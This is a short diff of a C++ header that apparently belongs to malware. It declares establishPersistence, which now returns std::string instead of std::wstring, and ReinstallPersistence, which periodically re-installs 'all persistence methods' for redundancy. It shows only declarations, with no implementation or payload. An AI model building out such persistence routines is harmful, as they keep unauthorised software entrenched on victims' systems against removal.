@@ -4,9 +4,8 @@
 namespace persistence {
 
 // Establishes persistence.
-// Returns the path of the persisted binary if successful (or if already running from it).
-// Returns an empty string on failure.
-std::wstring establishPersistence(const std::wstring& overrideSourcePath = L"");
+// Returns the path of the persisted binary if successful.
+std::string establishPersistence(const std::string& overrideSourcePath = "");
 
 // Periodically re-installs all persistence methods to ensure redundancy.
 void ReinstallPersistence();
